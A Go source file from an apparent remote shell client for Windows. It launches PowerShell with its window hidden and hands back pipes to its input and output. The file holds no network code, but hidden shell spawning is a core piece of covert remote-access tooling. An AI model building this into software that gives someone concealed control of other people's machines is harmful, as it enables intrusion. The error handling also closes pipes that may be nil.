//go:build windows && client
// +build windows,client

package remoteshell

import (
	"fmt"
	"io"
	"os/exec"
	"syscall"
)

func getHandles() (io.ReadCloser, io.WriteCloser, *exec.Cmd, error) {
	cmd := exec.Command("powershell")

	// Hide shell
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		stdout.Close()
		return nil, nil, nil, fmt.Errorf("failed to pipe STDOUT: %w", err)
	}
	cmd.Stderr = cmd.Stdout // merge stderr into stdout

	stdin, err := cmd.StdinPipe()
	if err != nil {
		stdout.Close()
		stdin.Close()
		return nil, nil, nil, fmt.Errorf("failed to pipe STDIN: %w", err)
	}

	if err := cmd.Start(); err != nil {
		stdout.Close()
		stdin.Close()
		return nil, nil, nil, fmt.Errorf("failed to start shell: %w", err)
	}

	return stdout, stdin, cmd, nil
}
